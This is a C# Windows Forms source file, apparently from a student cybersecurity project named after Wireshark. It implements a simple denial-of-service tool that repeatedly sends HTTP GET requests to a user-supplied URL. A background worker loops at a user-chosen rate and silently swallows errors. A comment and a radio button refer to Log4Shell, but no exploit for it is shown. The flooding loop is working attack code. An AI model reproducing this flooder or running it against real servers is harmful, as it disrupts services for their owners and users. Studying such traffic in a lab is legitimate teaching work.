using Microsoft.Extensions.Configuration;

namespace CybBezWireshark
{
    public partial class Form1 : Form
    {
        private readonly IConfiguration config;
        //DoS
        private readonly HttpClient httpClient;
        private bool SendRequests;
        private int Frequency;
        private string Url;

        public Form1(IConfiguration config)
        {
            InitializeComponent();
            this.config = config;

            //DoS
            this.httpClient = new HttpClient();
            button3.Enabled = false;
            backgroundWorker1.RunWorkerAsync();

            //Log4Shell
            radioButton2.Checked = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                httpClient.GetAsync(textBox1.Text);
            }
            catch (Exception exc)
            {
            }
        }

        //DoS
        private void button2_Click(object sender, EventArgs e)
        {
            Url = textBox1.Text;
            Frequency = trackBar1.Value;
            trackBar1.Enabled = false;
            button2.Enabled = false;
            button3.Enabled = true;
            SendRequests = true;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            trackBar1.Enabled = true;
            button2.Enabled = true;
            button3.Enabled = false;
            SendRequests = false;
        }

        private void backgroundWorker1_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            while (true)
                while (SendRequests)
                {
                    try
                    {
                        httpClient.GetAsync(Url);
                        Thread.Sleep(1000 / Frequency);
                    }
                    catch (Exception exc)
                    {
                    }
                }

        }
    }
}